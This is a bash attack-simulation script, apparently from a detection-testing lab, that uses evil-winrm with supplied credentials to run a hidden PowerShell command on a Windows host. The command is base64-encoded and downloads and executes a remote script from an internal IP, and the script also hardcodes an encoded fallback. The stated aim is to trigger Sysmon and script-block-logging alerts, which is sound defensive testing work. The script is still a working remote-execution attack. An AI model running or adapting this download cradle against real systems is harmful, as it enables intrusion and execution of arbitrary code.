#!/usr/bin/env bash
# Ataque 5: Ejecucion de payload malicioso (MITRE T1204.002 / T1059.001)
# Simula la entrega y ejecucion de un comando ofuscado tipo "living off the land",
# analogo al comportamiento observado tras macros maliciosas o adjuntos de phishing.
# Uso: ./attack5_payload_exec.sh <IP_WIN_WORKSTATION>
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP_ESTACION_WINDOWS>}"

INICIO=$(log_inicio)
echo "[+] Entregando y ejecutando payload de prueba en ${TARGET} via WinRM (evil-winrm)..."
# Requiere credenciales validas de un usuario local/dominio para el ejercicio controlado
read -rp "Usuario WinRM: " WU
read -rsp "Password WinRM: " WP; echo
# Normalizar el formato del usuario: lab.env usa "DOMINIO/usuario" (barra
# normal, formato de Impacket). evil-winrm, en cambio, espera "DOMINIO\usuario"
# (barra invertida); si recibe la barra normal la toma como parte literal del
# nombre de usuario y la autenticacion falla con WinRMAuthorizationError
# (aunque las credenciales sean validas). Se convierte '/' -> '\'.
WU="${WU//\//\\}"
# Payload REALISTA tipo "download cradle" (T1059.001): PowerShell ofuscado con
# -EncodedCommand que, al decodificarse, descarga y ejecuta un script remoto
# (IEX + Net.WebClient.DownloadString). No necesita que el servidor remoto
# exista: la sola ejecucion deja (a) la linea de comando con -enc en Sysmon
# Event 1 y (b) el bloque de script decodificado (IEX/DownloadString) en el
# PowerShell Script Block Logging (Event 4104). Ambas evidencias disparan la
# regla 100051. Es el comportamiento real de un payload malicioso, no un
# placeholder inocuo.
CRADLE="IEX (New-Object Net.WebClient).DownloadString('http://10.0.30.20:8000/update.ps1')"
ENC=$(python3 -c "import base64,sys;print(base64.b64encode(sys.argv[1].encode('utf-16-le')).decode())" "$CRADLE" 2>/dev/null)
[ -n "$ENC" ] || ENC='SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADMAMAAuADIAMAA6ADgAMAAwADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA='
CMD="powershell -nop -w hidden -enc ${ENC}"
LOGF="/tmp/payload_$(date +%s).log"
# evil-winrm no tiene un flag para ejecutar un solo comando (-e es la ruta de
# ejecutables C#, no un comando); es una shell interactiva, así que el
# comando se envía por stdin como si se hubiera escrito en el prompt remoto.
# Reintentos: por si el endpoint WinRM devuelve un error transitorio bajo
# carga, se reintenta hasta 4 veces y solo se da por exitoso si aparece
# "Connection successful".
OK=0
for intento in 1 2 3 4; do
  { echo "${CMD}"; echo "exit"; } | evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" > "$LOGF" 2>&1 || true
  if grep -q "Connection successful" "$LOGF"; then OK=1; break; fi
  echo "    (intento ${intento}: WinRM no respondió a la autenticación; reintentando...)"
  sleep 20
done
cat "$LOGF"
[ "$OK" -eq 1 ] && echo "[+] Payload ejecutado (WinRM shell establecida)." || echo "[!] WinRM no respondió tras 4 intentos."
log_fin "payload_execution" "T1059.001" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
